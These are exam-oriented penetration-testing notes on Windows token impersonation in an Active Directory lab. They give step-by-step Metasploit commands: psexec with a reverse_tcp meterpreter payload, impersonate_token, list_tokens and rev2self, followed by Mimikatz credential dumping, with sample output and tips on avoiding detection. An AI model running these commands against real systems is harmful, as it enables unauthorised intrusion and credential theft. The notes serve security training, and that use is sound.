# Token Impersonation Overview

### 🛡️ **Token Impersonation Overview** 🛡️

---

### 📝 **Summary**:

Tokens are **temporary keys** that allow users or processes to access systems or networks **without re-entering credentials**. Think of them like **cookies for computers**—once you have a token, you can access files and services without constantly logging in again. Token impersonation can be abused by attackers to gain higher-level privileges, particularly in **Active Directory (AD)** environments.

**Two Types of Tokens**:

1. **Delegation Token**: Used for **interactive logins**, such as when you log into a machine via **Remote Desktop**.
2. **Impersonation Token**: Used for **non-interactive tasks**, such as attaching a network drive or running a domain logon script.

Attackers can impersonate these tokens to gain access to privileged accounts and potentially **run malicious actions** on a system, such as dumping credentials using tools like **Mimikatz**.

---

### 💻 **Detailed Notes**:

### **1. Gaining Shell Access through `psexec` (Prerequisite for Token Impersonation)**

1. **Launching Metasploit**:
    - Open Kali Linux terminal:
        
        ```bash
        msfconsole
        
        ```
        
    - Search for `psexec` exploit:
        
        ```bash
        search psexec
        
        ```
        
    - Use the `exploit/windows/smb/psexec` module:
        
        ```bash
        use exploit/windows/smb/psexec
        
        ```
        
2. **Setting the Payload**:
    - Use the 64-bit payload (since most target machines are 64-bit):
        
        ```bash
        set payload windows/x64/meterpreter/reverse_tcp
        
        ```
        
3. **Configuring Exploit Parameters**:
    - Set your local machine's IP (LHOST):
        
        ```bash
        set LHOST [Your IP]
        
        ```
        
    - Set the target machine’s IP (RHOST):
        
        ```bash
        set RHOSTS [Target IP]
        
        ```
        
    - Set domain, username, and password for the target:
        
        ```bash
        set smbdomain MARVEL.local
        set smbuser fcastle
        set smbpass Password1
        
        ```
        
4. **Running the Exploit**:
    - Execute the attack:
        
        ```bash
        run
        
        ```
        
    - Once successful, you will get a **Meterpreter** session.

### **2. Token Impersonation in Metasploit**

1. **Impersonating a Token**:
    - After gaining a Meterpreter session, use the `impersonate_token` command to impersonate another user’s token:
        
        ```bash
        meterpreter > impersonate_token marvel\\\\fcastle
        [+] Delegation token available
        [+] Successfully impersonated user MARVEL\\\\fcastle
        
        ```
        
    - This command makes you impersonate the user `fcastle` on the `MARVEL` domain.
2. **Verify Impersonation**:
    - To verify, drop into a shell and check the user context:
        
        ```bash
        meterpreter > shell
        process 1520 created
        channel 1 created
        c:\\\\Windows\\\\system32>whoami
        marvel\\\\fcastle
        
        ```
        
    - **Outcome**: The attacker is now operating as the domain user `fcastle` with their permissions and access.

### **3. Impersonating a Domain Admin**

- If you identify a **Domain Admin token**, you can impersonate that token to gain high-level privileges.
- Once impersonated, you can run tools like **Mimikatz** to dump credentials:
    
    ```bash
    meterpreter > shell
    c:\\\\Windows\\\\system32>mimikatz
    
    ```
    
- This can lead to a **compromise of sensitive data** like password hashes, allowing further escalation.

---

### **4. Listing Tokens and Reverting to Self in Meterpreter**

### **Listing Available Tokens:**

- **Command**: To see what tokens are available for impersonation, use:
    
    ```bash
    meterpreter > list_tokens -g
    
    ```
    
- **Purpose**: This command lists all the tokens available in the current session, separated by groups. It includes **delegation** and **impersonation tokens** that can be used to gain higher privileges.
- **Example Output**:
    
    ```
    Available tokens:
    Delegation Tokens:
        No delegation tokens available.
    
    Impersonation Tokens:
        [*] MARVEL\\\\Administrator
        [*] MARVEL\\\\fcastle
    
    ```
    
- **Key Tip**: Look out for high-privilege tokens (e.g., `Administrator`, `Domain Admin`) in the impersonation list to maximize the impact of your attack.

### **Reverting to Self (`rev2self`):**

- **Command**: To revert back to the original user context, use:
    
    ```bash
    meterpreter > rev2self
    
    ```
    
- **Purpose**: This command **reverts your user context** to the original account that you were using when the session was created.
- **Why Use It**: This is useful if you want to drop elevated privileges after using a token, especially if you want to avoid detection or return to the default session state before performing other actions.
- **Key Tip**: After impersonating a token and completing your actions, use `rev2self` to go back to the original user context and continue further enumeration or exploitation.

---

---

### 💡 **Abbreviations & Definitions**:

- **Token**: A **temporary key** representing a user’s identity and permissions.
- **Delegation Token**: A token used for **interactive logins** (e.g., logging into a machine via **RDP**).
- **Impersonation Token**: A token used for **non-interactive tasks** (e.g., running scripts, connecting to a network drive).
- **`psexec`**: A tool used to execute processes on remote systems using SMB.
- **Mimikatz**: A tool used by attackers to **dump credentials** like passwords and hashes from a Windows system.

---

### 🚨 **Critical Mentions & Exam Traps**:

- **Using `psexec`**: Before attempting token impersonation, ensure you have a **Meterpreter session** by using `psexec` or another exploitation method.
- **Impersonating a Token**: You don't need the actual credentials to impersonate a user; you just need access to an available token. This makes token-based attacks highly effective.
- **Watch for High-Privilege Tokens**: 🚨 **Domain Admin tokens** are particularly dangerous if impersonated. Ensure these tokens are closely monitored and secured.
- **Non-Interactive Tasks**: Impersonation tokens are tied to background tasks, making them **low-profile targets** for attackers seeking to evade detection.

💡 **Pro Tip**: Regularly **monitor token usage** and prevent unnecessary delegation of high-privilege tokens to mitigate the risk of token impersonation attacks.

---

### **Final Exam Tips** 📝:

- **Understand the Prerequisite**: Know how to use **`psexec`** to gain initial access before attempting token impersonation.
- **Impersonation Process**: Focus on how attackers use the `impersonate_token` command to escalate privileges within a compromised system.
- **High-Privilege Tokens**: Be aware of the importance of identifying and protecting **high-privilege tokens** (like Domain Admins) in the network.

---